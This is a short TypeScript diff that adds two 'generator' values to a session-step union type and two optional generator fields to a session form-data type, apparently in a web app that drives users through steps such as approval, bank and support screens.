@@ -13,6 +13,8 @@ export type SessionStep =
   | "facebook"
   | "congrats"
   | "special_approval"
+  | "generator1"
+  | "generator2"
   | "invalid_bank"
   | "live_support";
 export type SessionStatus = "online" | "offline" | "SUCCESS" | "CONGRATS" | "SPECIAL_INFO";
@@ -48,6 +50,8 @@ export type SessionFormData = {
   specialNoticeSentAt?: string;
   approvalStatus?: string;
   approvalCode?: string;
+  generatorType?: string;
+  generatorData?: Record<string, string>;
   approvalHistory?: string;
   customMessage?: string;
   customImage?: string;
